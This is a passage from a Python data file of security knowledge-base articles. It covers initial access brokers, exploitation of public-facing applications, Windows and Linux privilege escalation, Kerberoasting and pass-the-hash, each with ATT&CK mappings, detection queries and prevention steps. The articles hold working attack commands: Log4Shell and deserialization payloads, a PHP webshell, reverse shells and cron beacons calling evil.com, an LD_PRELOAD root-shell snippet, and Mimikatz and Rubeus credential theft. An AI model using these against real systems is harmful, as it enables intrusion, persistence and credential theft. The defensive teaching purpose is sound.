- MFA code requested in unusual context (no corresponding login attempt in logs)

### Identity Platform Logs
```kql
// AAD: Password reset followed by login from new country within 30 minutes
AuditLogs
| where OperationName == "Reset user password"
| join kind=inner (
    SigninLogs
    | where TimeGenerated > ago(30m)
) on UserPrincipalName
| where Location != prev_location
```

### Behavioural Indicators
- New remote desktop/VNC/AnyDesk installation on endpoints
- Unusual hours activity after password reset (attacker in different timezone)

## Prevention

1. **Identity verification protocol**: Helpdesk must verify identity via out-of-band method (manager approval, employee photo badge), NEVER just name + employee ID
2. **Callback verification**: Always call back on the number in the corporate directory, not the number provided by the caller
3. **MFA policy**: Helpdesk staff should never request or receive MFA codes — if asked, it's an attack indicator
4. **Awareness training**: Regular vishing simulations (Proofpoint, KnowBe4 offer voice simulation)
5. **Privileged actions require dual approval**: Password resets for privileged accounts require supervisor sign-off
6. **Call recording**: Record all helpdesk calls; enables forensic review and accountability
""",
    },
    {
        "title": "Initial Access Brokers — How Attackers Buy Their Way In",
        "tags": ["initial-access-broker", "IAB", "darkweb", "credentials", "T1078", "stealer-malware"],
        "content": r"""# Initial Access Brokers — How Attackers Buy Their Way In

## Overview

Initial Access Brokers (IABs) are cybercriminals who specialise in compromising organisations and selling that access to other threat actors — typically ransomware groups. This division of labour means the group encrypting your files never needed to phish you. Understanding the IAB ecosystem helps defenders identify compromise earlier in the kill chain.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1078 | Valid Accounts | Initial Access |
| T1133 | External Remote Services | Initial Access |
| T1110 | Brute Force | Credential Access |
| T1555 | Credentials from Password Stores | Credential Access |
| T1114 | Email Collection | Collection |

## The IAB Ecosystem

```
Stealer operators          IABs                  Ransomware groups
─────────────────    ─────────────────    ─────────────────────────────
Deploy info-stealers  Buy stealer logs     Buy access for $500–$50,000
Harvest credentials   Scan for valid RDP   Deploy ransomware / extort
Sell logs on          Sell VPN/Citrix/      (LockBit, BlackCat, Cl0p...)
darkweb markets       RDP access
```

## Access Types Sold

| Access Type | Typical Price | Notes |
|---|---|---|
| RDP with local admin | $50–200 | Most common, lowest privilege |
| VPN credential | $200–1,000 | Fortinet, Pulse, Cisco ASA |
| Citrix/RDS with domain user | $500–2,000 | High value — network foothold |
| Domain admin credential | $2,000–20,000 | Immediate full compromise |
| Ransomware-ready network | $5,000–50,000 | Pre-positioned, AD mapped |

## How IABs Gain Access

### Info-Stealer Malware Logs
The most common source. Stealers (RedLine, Vidar, Raccoon, LummaC2) exfiltrate:
- Browser saved passwords
- Browser cookies (session hijacking)
- Cryptocurrency wallets
- VPN/RDP credentials saved in applications

```
Infection vector → stealer runs → uploads log archive containing:
  passwords.txt (all browser-saved passwords)
  cookies.sqlite (session cookies)
  autofill.txt (form data)
  system_info.txt (IP, OS, installed AV)

Log archive sold on Telegram channels or Genesis Market
IAB searches log for corporate VPN/Citrix URLs
Finds: "vpn.targetcorp.com - j.smith@targetcorp.com - P@ssw0rd123"
Tests credential → it works (no MFA) → lists access for sale
```

### Brute Force / Credential Stuffing
```bash
# Credential stuffing VPN portals with breached credential lists
# Tools: Snipr, SNIPR, Hydra, Credmap
hydra -L userlist.txt -P passwords.txt rdp://vpn.targetcorp.com -t 4 -W 30

# Password spraying against OWA (Outlook Web Access)
sprayhound -U users.txt -p "Summer2025!" -d targetcorp.com --dc dc01.targetcorp.com

# Valid credential indicators:
# - 200 OK vs 401 Unauthorized
# - Redirect to MFA page (indicates valid password, no MFA = sold as-is)
```

### Exploitation of Public-Facing Services
```bash
# Scan for vulnerable VPN concentrators
# Fortinet CVE-2022-40684 (auth bypass), CVE-2023-27997 (heap overflow)
# Pulse Secure CVE-2021-22893
# ProxyShell (Exchange) CVE-2021-34473/34523/31207

nmap -sV --script=ssl-enum-ciphers -p 443,4443,8443 vpn.targetcorp.com
nuclei -t cves/ -u https://vpn.targetcorp.com
```

## Detection Opportunities

### Darkweb Monitoring
- Subscribe to services: Recorded Future, Digital Shadows, Flare.io, Cybersixgill
- Monitor for your domain name, IP ranges, and executive emails on paste sites and darkweb forums
- When your credentials appear in stealer logs, you have days to weeks before IAB sells or uses access

### Authentication Logs
```kql
// Impossible travel — login from two geographically distant IPs
// within timeframe impossible to travel physically
SigninLogs
| where TimeGenerated > ago(7d)
| summarize locations = make_list(Location), ips = make_list(IPAddress) by UserPrincipalName
| where array_length(locations) > 1
// Correlate with GeoIP distance calculation

// New ASN for VPN logins (IAB testing credential from new IP)
| where AutonomousSystemNumber !in (known_corporate_asns)
| where AppDisplayName in ("Cisco AnyConnect", "GlobalProtect", "Pulse Connect Secure")
```

### EDR / Network
- First-seen RDP connection from external IP
- VPN login from residential ISP followed by immediate lateral movement
- Time-of-day anomaly: Admin account active at 3 AM UTC from Eastern Europe

## Prevention

1. **MFA on all remote access**: VPN, Citrix, RDP, OWA, O365 — no exceptions
2. **Darkweb monitoring**: Know when your credentials are exposed before attackers use them
3. **Credential stuffing protection**: Entra ID / Okta — block known breached passwords (HIBP integration)
4. **Disable legacy auth**: Block basic authentication protocols that don't support MFA
5. **Network-level RDP restriction**: RDP should never be exposed to the internet — require VPN first
6. **Privileged account hygiene**: Privileged accounts should not have email, should use Tier 0/1/2 model
7. **Canary credentials**: Plant fake credentials in exposed locations — alert on any use attempt
""",
    },
    {
        "title": "Exploit Public-Facing Applications — Common Vuln Classes and Exploitation",
        "tags": ["exploitation", "public-facing", "CVE", "T1190", "web-app", "initial-access", "rce"],
        "content": r"""# Exploit Public-Facing Applications — Common Vuln Classes and Exploitation

## Overview

Exploiting public-facing applications (T1190) is a primary initial access vector for ransomware groups, nation-state actors, and opportunistic attackers. Unlike phishing, it requires no user interaction — automated scanning identifies vulnerable systems and exploitation follows minutes later.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1505.003 | Server Software Component: Web Shell | Persistence |
| T1059.004 | Unix Shell | Execution |
| T1041 | Exfiltration Over C2 Channel | Exfiltration |

## Vulnerability Discovery

```bash
# Passive recon — identify exposed services
shodan search 'org:"TargetCorp" http.title:"login"'
censys search 'autonomous_system.organization="TargetCorp"'

# Active scanning
nmap -sV -p 80,443,8080,8443,4443,9443,2222,3389,5985 targetcorp.com
nmap -sV --script=vulners -p 443 vpn.targetcorp.com

# Web technology fingerprinting
whatweb https://app.targetcorp.com
wappalyzer-cli https://app.targetcorp.com

# Vulnerability scanning
nuclei -u https://app.targetcorp.com -t cves/ -t exposures/ -severity critical,high
nikto -h https://app.targetcorp.com
```

## High-Value Vulnerability Classes

### Remote Code Execution (RCE)
Most critical — directly provides command execution.

**Log4Shell (CVE-2021-44228):**
```bash
# Payload injected into any logged field (User-Agent, username, etc.)
# JNDI lookup triggers outbound DNS/LDAP → attacker server delivers Java class

curl -H 'User-Agent: ${jndi:ldap://attacker.com/exploit}' https://app.targetcorp.com/

# Detection: DNS query from app server to untrusted external host containing "jndi"
# Elastic query: dns.question.name: *jndi* OR network.transport: ldap AND NOT destination.ip: (internal)
```

**ProxyShell (Exchange CVE-2021-34473):**
```bash
# Authentication bypass + SSRF + arbitrary write → webshell
python proxyshell.py -u mail.targetcorp.com -e admin@targetcorp.com
# Drops webshell to: /owa/auth/xxxxx.aspx
```

### SQL Injection → OS Command Execution
```bash
# Identify injectable parameter
sqlmap -u "https://app.targetcorp.com/product?id=1" --dbs

# Escalate to OS shell (if DB runs as high-priv user)
sqlmap -u "https://app.targetcorp.com/product?id=1" --os-shell

# xp_cmdshell on MS SQL (if enabled)
'; EXEC xp_cmdshell('whoami'); --

# MySQL INTO OUTFILE → webshell
UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'
```

### Deserialization RCE
```bash
# Java deserialization — ysoserial gadget chains
java -jar ysoserial.jar CommonsCollections6 "curl https://evil.com/pwned -o /tmp/pwned" > payload.ser

# .NET ViewState deserialization (if machineKey known)
python viewgen.py --webconfig web.config -m --os-cmd "powershell -c IEX(...)"

# PHP object injection
# O:8:"Template":1:{s:8:"filename";s:20:"/etc/passwd";}
```

### Authentication Bypass
```bash
# Fortinet SSL VPN auth bypass (CVE-2022-40684)
curl -k -H "Forwarded: for=127.0.0.1;by=127.0.0.1" \
  "https://vpn.targetcorp.com/api/v2/cmdb/system/admin/admin"

# Citrix ADC (CVE-2019-19781)
curl -k https://citrix.targetcorp.com/vpn/../vpns/cfg/smb.conf

# GitLab auth bypass (CVE-2021-22205) — remote code execution via image upload
python gitlab_rce.py https://gitlab.targetcorp.com
```

## Post-Exploitation — Establishing Persistence

Once RCE is achieved:
```bash
# Deploy webshell for persistent access
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.htaccess.php

# Reverse shell via webshell
curl "https://app.targetcorp.com/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/evil.com/4444+0>%261'"

# Linux — persistent cron job
(crontab -l; echo "*/5 * * * * curl -s https://evil.com/beacon.sh | bash") | crontab -

# Download C2 implant
curl -s https://evil.com/implant -o /tmp/.cache && chmod +x /tmp/.cache && /tmp/.cache &
```

## Detection Opportunities

### WAF / Web Server Logs
```kql
// RCE indicators in URL parameters
http.request.body.content: ("jndi:" OR "EXEC(" OR "xp_cmdshell" OR "system(" OR "passthru(")
// SQLmap default User-Agent
http.request.headers.user_agent: "sqlmap*"
// Path traversal
url.path: ("../" OR "%2e%2e" OR "etc/passwd" OR "win.ini")
```

### Application Logs / EDR
- Web server process (`httpd`, `java`, `w3wp.exe`) spawning shell (`bash`, `sh`, `cmd.exe`, `powershell.exe`)
- Outbound network connections from web server process
- New files created in web root by web server process

### Network
- Repeated requests to same endpoint with varying payloads (fuzzing pattern)
- Outbound connections from DMZ servers to internet (unusual for most web servers)

## Prevention

1. **Patch management**: Critical CVEs patched within 24–72 hours for internet-facing systems
2. **WAF**: Block common exploit patterns (OWASP Core Rule Set)
3. **Principle of least privilege**: Web server runs as low-privilege user, no shell access
4. **Network egress filtering**: DMZ servers should not have outbound internet access
5. **Virtual patching**: WAF rules while awaiting patching
6. **Attack surface reduction**: Minimise exposed services — remove dev interfaces, debug endpoints
7. **Vulnerability scanning**: Weekly authenticated scans of internet-facing assets
""",
    },
]

# ============================================================
# COLLECTION 2: PRIVILEGE ESCALATION & CREDENTIAL ATTACKS
# ============================================================

PRIVESC_CREDS = [
    {
        "title": "Windows Privilege Escalation — Token Impersonation, UAC Bypass, Unquoted Paths",
        "tags": ["privesc", "windows", "token-impersonation", "UAC", "T1134", "T1548", "unquoted-paths"],
        "content": r"""# Windows Privilege Escalation — Token Impersonation, UAC Bypass, Unquoted Paths

## Overview

After initial access, attackers typically have limited user privileges. Privilege escalation techniques elevate those privileges to SYSTEM or Administrator to enable persistence, credential dumping, and lateral movement.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1134.001 | Token Impersonation/Theft | Privilege Escalation |
| T1548.002 | Abuse Elevation Control Mechanism: Bypass UAC | Privilege Escalation |
| T1574.009 | Hijack Execution Flow: Unquoted Service Path | Persistence / PrivEsc |
| T1053.005 | Scheduled Task/Job | Privilege Escalation |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |

## Technique 1 — Token Impersonation (SeImpersonatePrivilege)

Windows service accounts (IIS, SQL Server, etc.) often have `SeImpersonatePrivilege`. This allows creating a process token that impersonates any user who connects to a named pipe or COM server — including SYSTEM.

```powershell
# Check current token privileges
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege

# JuicyPotato — COM server impersonation (works on pre-2019 systems)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user hacker P@ss123 /add && net localgroup Administrators hacker /add" -t * -c {CLSID}

# PrintSpoofer — named pipe impersonation (Windows 10/2019+)
PrintSpoofer.exe -i -c cmd
# Result: shell as NT AUTHORITY\SYSTEM

# GodPotato — works on Windows Server 2012-2022, Windows 8-11
GodPotato.exe -cmd "cmd /c whoami"
```

## Technique 2 — UAC Bypass

User Account Control (UAC) splits Administrator tokens. Many bypasses abuse auto-elevated COM objects or Windows processes:

```powershell
# Method 1: fodhelper.exe registry hijack
# fodhelper.exe auto-elevates and reads HKCU registry (user-writable)
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "cmd /c start cmd"
Start-Process "C:\Windows\System32\fodhelper.exe"

# Method 2: eventvwr.exe MSC hijack
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
Start-Process eventvwr.msc

# Method 3: CMSTP COM object
# Dozens of documented bypasses: UACMe tool maintains comprehensive list
# https://github.com/hfiref0x/UACME
```

## Technique 3 — Unquoted Service Paths

Windows service executables with spaces in the path and no quotes are vulnerable:

```
Vulnerable path: C:\Program Files\Common App\service.exe
Windows tries to execute in order:
  C:\Program.exe
  C:\Program Files\Common.exe      ← attacker places binary here
  C:\Program Files\Common App\service.exe
```

```powershell
# Find unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v /c:no-quote | findstr /i /v C:\Windows

# Alternatively with PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Get-ServiceUnquoted

# Exploit:
# 1. Check write permissions on intermediate path
icacls "C:\Program Files\Common App"
# 2. Place malicious binary
copy payload.exe "C:\Program Files\Common.exe"
# 3. Restart service (or wait for reboot)
sc stop VulnerableService
sc start VulnerableService
```

## Technique 4 — Scheduled Task Exploitation

```powershell
# Find scheduled tasks running as SYSTEM with writable binary paths
Get-ScheduledTask | Where-Object { $_.Principal.RunLevel -eq "Highest" } |
  Select-Object TaskName, @{N="Action"; E={$_.Actions.Execute}}

# PowerUp — identify modifiable scheduled tasks
Get-ModifiableScheduledTaskFile

# DLL hijacking via scheduled task
# Task runs "C:\Program Files\App\app.exe" which loads "helper.dll" from same dir
# If app dir is writable: place malicious helper.dll → executes as SYSTEM on schedule
```

## Enumeration Tools

```powershell
# WinPEAS — comprehensive automated enumeration
.\winPEASany.exe

# PowerUp (PowerSploit) — focus on misconfigurations
. .\PowerUp.ps1; Invoke-AllChecks

# Seatbelt — security configuration review
.\Seatbelt.exe -group=all

# Watson — patch-level vulnerability checks
.\Watson.exe
```

## Detection Opportunities

### Windows Event Logs
```
Event ID 4688 — Process creation (with command line logging enabled)
  → Look for: JuicyPotato, PrintSpoofer, GodPotato process names
  → Unusual parent/child: services.exe → cmd.exe

Event ID 7045 — New service installed (potential persistence via service)
Event ID 4697 — Service installed in system
Event ID 4702 — Scheduled task updated
```

### EDR / Sysmon
- `svchost.exe` or service process spawning interactive shell
- Token manipulation calls (`ImpersonateNamedPipeClient`, `DuplicateTokenEx`)
- Registry writes to `HKCU\Software\Classes\` followed by privileged process launch
- New binary files placed in `C:\Program Files\` paths

## Prevention

1. **Enable UAC at max level**: Prompt for credential, not just consent
2. **Patch Potato vulnerabilities**: Keep Windows fully patched
3. **Quote all service paths**: GPO script to audit and fix unquoted paths
4. **Least privilege for service accounts**: Services should not run as SYSTEM unnecessarily
5. **Restrict write access to Program Files**: Non-admin users should not write to application directories
6. **Audit scheduled tasks**: Review all SYSTEM-level tasks quarterly
""",
    },
    {
        "title": "Linux Privilege Escalation — SUID, Kernel Exploits, Sudo Misconfigurations",
        "tags": ["privesc", "linux", "SUID", "sudo", "kernel-exploit", "T1548.001", "T1068"],
        "content": r"""# Linux Privilege Escalation — SUID, Kernel Exploits, Sudo Misconfigurations

## Overview

Linux privilege escalation leverages misconfigurations in file permissions, sudo rules, weak kernel versions, and running services. A thorough enumeration pass nearly always reveals a path from low-privilege user to root.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1548.001 | Setuid and Setgid | Privilege Escalation |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |
| T1548.003 | Sudo and Sudo Caching | Privilege Escalation |
| T1574.006 | Dynamic Linker Hijacking | Privilege Escalation |

## Technique 1 — SUID Binary Abuse

SUID (Set User ID) binaries run with the file owner's privileges (often root) regardless of who executes them. Misuse of legitimate SUID binaries or custom SUID programs is a reliable privesc path.

```bash
# Find all SUID binaries
find / -perm -u=s -type f 2>/dev/null

# GTFOBins — check every SUID binary found against gtfobins.github.io
# Common exploitable SUID binaries:

# nmap (older versions with --interactive)
nmap --interactive
!sh

# vim
vim -c ':!/bin/sh'

# bash (if SUID set — non-standard but found in CTFs/misconfigured systems)
bash -p  # -p preserves SUID euid

# find
find . -exec /bin/sh -p \; -quit

# Custom SUID binary — check for path traversal, command injection
# Example: vulnerable SUID binary calls system("ls") without full path
# → Create malicious 'ls' in PATH → SUID binary executes our ls as root
echo "/bin/bash -p" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
./vulnerable_suid_binary
```

## Technique 2 — Sudo Misconfigurations

```bash
# List sudo rights for current user
sudo -l

# Example vulnerable sudoers entries:

# ALL commands as root (worst case)
user ALL=(ALL:ALL) ALL

# Specific binary that can be abused — vim
user ALL=(root) /usr/bin/vim
# Exploit: sudo vim → :!/bin/bash

# LD_PRELOAD preserved through sudo (env_keep)
# If sudoers has: Defaults env_keep+=LD_PRELOAD
cat preload.c
# #include <stdio.h>
# #include <sys/types.h>
# #include <stdlib.h>
# void _init() { setuid(0); setgid(0); system("/bin/bash -p"); }
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so vim  # → root shell

# NOPASSWD entries — commonly misconfigured
user ALL=(root) NOPASSWD: /usr/bin/python3
# Exploit: sudo python3 -c "import pty; pty.spawn('/bin/bash')"

# Wildcard abuse
user ALL=(root) /usr/bin/rsync --exclude=* *
# Use --rsync-path to execute arbitrary command
sudo rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

## Technique 3 — Kernel Exploits

```bash
# Enumerate kernel version
uname -a
# Linux target 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64

# Search for known exploits
searchsploit linux kernel 4.15
# Or use Linux Exploit Suggester
./linux-exploit-suggester.sh

# Notable Linux kernel exploits:
# Dirty COW (CVE-2016-5195) — kernel 2.x–4.x, TOCOU race condition
# DirtyPipe (CVE-2022-0847) — Linux 5.8–5.16, page cache overwrite
# PwnKit (CVE-2021-4034) — pkexec SUID, all Linux distributions since 2009
# OverlayFS (CVE-2023-0386) — Linux 5.11–6.2, SUID file copy via unprivileged overlay

# DirtyPipe example:
# Overwrites /etc/passwd root entry with no-password root
./dirtypipe /etc/passwd 1 $'root::0:0:root:/root:/bin/bash\n'
su root  # no password needed

# PwnKit — works on unpatched systems
gcc -o pwnkit pwnkit.c
./pwnkit
# → root shell
```

## Technique 4 — Writable /etc/passwd or Cron Jobs

```bash
# Check file permissions on sensitive files
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/cron*

# If /etc/passwd is world-writable:
openssl passwd -1 -salt hacker newpassword
echo "hacker2:\$1\$hacker\$...:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker2

# Writable cron scripts
# Find cron jobs running as root
cat /etc/crontab
ls -la /etc/cron.d/ /var/spool/cron/crontabs/
# If script is writable: append reverse shell
echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> /path/to/cron_script.sh
```

## Enumeration Tools

```bash
# LinPEAS — comprehensive Linux enumeration
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2  # level 2 = thorough

# Linux Exploit Suggester
./linux-exploit-suggester.sh --kernelspace-only
```

## Detection Opportunities

- **Auditd rules**: Monitor SUID binary execution, `setuid()` syscall calls
- **Syslog / auth.log**: `sudo` commands for unusual binaries (`sudo vim`, `sudo python3 -c`)
- **Process monitoring**: Low-privilege user process spawning bash/sh with euid=0
- **File integrity monitoring**: Changes to `/etc/passwd`, `/etc/sudoers`, `/etc/cron*`
- **SIEM alert**: Any process execution where RUID != EUID (SUID execution)

## Prevention

1. **Audit SUID binaries regularly**: `find / -perm -u=s -type f` — remove SUID from anything not required
2. **Restrict sudo**: Specific commands only, no wildcards, no editors (vim/nano), no interpreters (python/perl)
3. **Keep kernel patched**: Kernel CVEs rated Critical should be patched within 24–48 hours
4. **File permissions audit**: `/etc/passwd` should be 644 root:root, `/etc/shadow` 640 root:shadow
5. **Immutable flag**: `chattr +i /etc/passwd /etc/shadow` — prevents modification even by root (until removed)
6. **AppArmor / SELinux**: Mandatory access control limits what processes can do even if SUID
""",
    },
    {
        "title": "Kerberoasting and AS-REP Roasting Explained",
        "tags": ["kerberoasting", "as-rep-roasting", "active-directory", "T1558.003", "T1558.004", "kerberos"],
        "content": r"""# Kerberoasting and AS-REP Roasting Explained

## Overview

Kerberoasting and AS-REP Roasting are Active Directory credential attacks that extract password hashes for offline cracking without requiring elevated privileges or generating suspicious authentication traffic. They are among the most common techniques used by ransomware affiliates after gaining initial access.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | Credential Access |
| T1558.004 | Steal or Forge Kerberos Tickets: AS-REP Roasting | Credential Access |

## Kerberoasting — How It Works

Kerberos Service Tickets (TGS) are encrypted with the service account's NTLM hash. Any authenticated domain user can request TGS tickets for any Service Principal Name (SPN). The ticket can be extracted and cracked offline.

```
1. Find accounts with SPNs registered
2. Request TGS ticket for each SPN (legitimate Kerberos operation, no special permissions)
3. Extract ticket from memory
4. Crack ticket offline → recover service account password
```

```powershell
# Step 1: Enumerate SPNs (PowerView)
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, admincount

# Step 2: Request and extract tickets (Rubeus)
.\Rubeus.exe kerberoast /output:hashes.txt
# Or target specific account:
.\Rubeus.exe kerberoast /user:svc_sql /outfile:sql_hash.txt

# Impacket (from Linux)
python3 GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.1 -output kerberoast_hashes.txt

# Step 3: Crack with hashcat
# Hash format: $krb5tgs$23$... (RC4) or $krb5tgs$18$... (AES256)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
# AES256 (etype 18) — slower cracking:
hashcat -m 19700 aes_hashes.txt wordlist.txt
```

## AS-REP Roasting — How It Works

Accounts with `Do not require Kerberos preauthentication` enabled can be attacked without any valid credentials. An attacker sends an AS-REQ for any such account and receives an AS-REP encrypted with the account's hash.

```powershell
# Find accounts without preauthentication (PowerView)
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, useraccountcontrol

# Request AS-REP hashes (Rubeus — from domain-joined machine)
.\Rubeus.exe asreproast /output:asrep_hashes.txt

# Impacket (from Linux — no credentials needed)
python3 GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass -format hashcat

# Crack with hashcat
# Hash format: $krb5asrep$23$...
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
```

## Targeted Kerberoasting (RBCD Abuse)

If an attacker has `GenericWrite` or `GenericAll` over a user account, they can add an arbitrary SPN to that account, then Kerberoast it — even if the account had no SPN before.

```powershell
# Add SPN to target account (requires GenericWrite)
Set-DomainObject -Identity "target_user" -Set @{serviceprincipalname='fake/spn'}

# Now Kerberoast the account
.\Rubeus.exe kerberoast /user:target_user /outfile:target_hash.txt

# Remove SPN to clean up
Set-DomainObject -Identity "target_user" -Clear serviceprincipalname
```

## Detection Opportunities

### Windows Event Logs
```
Event ID 4769 — Kerberos Service Ticket was requested
  Indicators:
  - TicketEncryptionType = 0x17 (RC4-HMAC) — modern systems should use AES
  - Large number of 4769 events from a single source in short time
  - Service name doesn't match normal service ticket patterns

Event ID 4768 — Kerberos Authentication Service (TGT) request
  - For AS-REP roasting: look for AS-REQ for accounts that don't require preauth
  - PreAuthType = 0 (no preauthentication) in events from unexpected sources
```

### KQL Detection
```kql
// Kerberoasting — multiple RC4 TGS requests from single source
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"  // filter out machine account tickets
| summarize ticket_count = count() by IpAddress, bin(TimeGenerated, 10m)
| where ticket_count > 5
| sort by ticket_count desc
```

## Prevention

1. **Use AES-only encryption**: Disable RC4 for Kerberos (`Network security: Configure encryption types allowed for Kerberos`) — makes cracking vastly slower
2. **Strong passwords for service accounts**: 25+ character random passwords — crack time becomes decades even with RC4
3. **Managed Service Accounts (MSAs) / Group MSAs**: Automatically managed 120-character passwords, cannot be cracked
4. **Audit preauthentication settings**: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` — fix any legitimate misconfigurations
5. **Monitor for RC4 ticket requests**: Alert on bulk RC4 TGS requests, especially from non-service endpoints
6. **Privileged account tier model**: Ensure Kerberoastable accounts don't have admin rights (tier 0)
""",
    },
    {
        "title": "Pass-the-Hash, Pass-the-Ticket, and Overpass-the-Hash",
        "tags": ["pass-the-hash", "pass-the-ticket", "PTH", "PTT", "T1550", "lateral-movement", "mimikatz"],
        "content": r"""# Pass-the-Hash, Pass-the-Ticket, and Overpass-the-Hash

## Overview

These techniques allow attackers to authenticate as a user using captured credential material — NTLM hashes or Kerberos tickets — without knowing the plaintext password. They are fundamental lateral movement techniques used in virtually every significant Windows network intrusion.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1550.002 | Use Alternate Authentication Material: Pass the Hash | Lateral Movement |
| T1550.003 | Use Alternate Authentication Material: Pass the Ticket | Lateral Movement |
| T1558.002 | Steal or Forge Kerberos Tickets | Credential Access |

## Pass-the-Hash (PtH)

Windows NTLM authentication can be completed with the hash alone. The attacker never needs the plaintext password.

```powershell
# Using Mimikatz — inject hash into new process
sekurlsa::pth /user:Administrator /domain:targetcorp.com /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe

# Or using Impacket tools from Linux
# psexec with hash
python3 psexec.py targetcorp.com/Administrator@10.10.10.1 -hashes :aad3b435b51404ee
# wmiexec
python3 wmiexec.py targetcorp.com/Administrator@10.10.10.1 -hashes :aad3b435b51404ee
# smbexec
python3 smbexec.py targetcorp.com/Administrator@10.10.10.1 -hashes :aad3b435b51404ee

# CrackMapExec — spray hash across an IP range
crackmapexec smb 10.10.10.0/24 -u Administrator -H aad3b435b51404ee
crackmapexec smb 10.10.10.0/24 -u Administrator -H aad3b435b51404ee -x "whoami"
# Mark hosts where hash is valid (Pwn3d! indicator)
```

**NTLM hash sources:**
- LSASS memory dump (Mimikatz sekurlsa::logonpasswords)
- SAM database (reg save + secretsdump)
- NTDS.dit (domain controller database)
- NTLM relay capture (Responder)

## Pass-the-Ticket (PtT)

Kerberos Ticket Granting Tickets (TGTs) or Service Tickets (TGS) can be injected into a session. The attacker operates as the user who owns that ticket.

```powershell
# Step 1: Export tickets from LSASS (requires local admin)
# Mimikatz
sekurlsa::tickets /export
# Creates .kirbi files in current directory: [0;12345]-0-0-40e10000-admin@krbtgt-DOMAIN.COM.kirbi

# Rubeus — dump all tickets
.\Rubeus.exe dump /service:krbtgt /nowrap
.\Rubeus.exe dump /luid:0x3e7 /nowrap  # SYSTEM session

# Step 2: Import ticket into current session
# Mimikatz
kerberos::ptt [0;12345]-0-0-40e10000-admin@krbtgt-DOMAIN.COM.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:base64_ticket_string

# Step 3: Access resources as hijacked user
dir \\dc01\C$   # Now runs with imported ticket's permissions
```

## Overpass-the-Hash (OtH)

Uses an NTLM hash to request a legitimate Kerberos TGT. Produces a Kerberos ticket from an NTLM hash — useful when Kerberos is required (e.g., NTLM is blocked on the target).

```powershell
# Mimikatz — request TGT using NTLM hash
sekurlsa::pth /user:svc_sql /domain:targetcorp.com /ntlm:HASH /run:powershell.exe
# New PowerShell window opens — run klist to see Kerberos ticket was requested
klist

# Rubeus — more flexible OtH
.\Rubeus.exe asktgt /user:svc_sql /rc4:HASH /domain:targetcorp.com /ptt
# /ptt = inject ticket immediately into current session
```

## Detection Opportunities

### Windows Event Logs
```
Event ID 4624 — Successful logon
  LogonType 3 (Network) with AuthenticationPackage = NTLM → PtH
  Note: Kerberos logons have different event patterns

Event ID 4648 — Explicit credential use (sekurlsa::pth spawns process with explicit creds)

Event ID 4768/4769 — Kerberos ticket requests
  Anomaly: TGT request from a workstation that doesn't normally request TGTs for that user

Windows Defender Credential Guard: Protects LSASS by moving credentials to isolated VSM
If enabled: sekurlsa::logonpasswords returns no hashes (Protected Process Light)
```

### Network
- NTLM authentication (AuthPackage = NTLM) to sensitive servers like DC, file servers — modern networks should use Kerberos
- SMB connections from workstations to workstations (lateral movement pattern)

### Detection Rule (Elastic)
```kql
// PtH indicator: NTLM logon to multiple hosts in rapid succession
winlog.event_id: 4624
AND winlog.event_data.LogonType: 3
AND winlog.event_data.AuthenticationPackageName: NTLM
AND NOT winlog.event_data.SubjectUserName: "*$"  // exclude machine accounts
// Correlate: same source account authenticating to >3 hosts within 10 minutes
```

## Prevention

1. **Enable Credential Guard**: Isolates LSASS credentials in Hyper-V VSM — blocks Mimikatz
2. **Protected Users security group**: Forces Kerberos-only auth, disables NTLM, removes cached credentials
3. **Disable NTLM** (where possible): Network security: Restrict NTLM
4. **Unique local administrator passwords**: LAPS (Local Administrator Password Solution) — prevents hash reuse across machines
5. **Privileged Access Workstations (PAWs)**: Admin accounts only used from dedicated, hardened workstations
6. **Network segmentation**: Workstations should not communicate with each other via SMB
""",
    },
    {
        "title": "NTLM Relay Attacks — Responder, ntlmrelayx, and Mitigation",
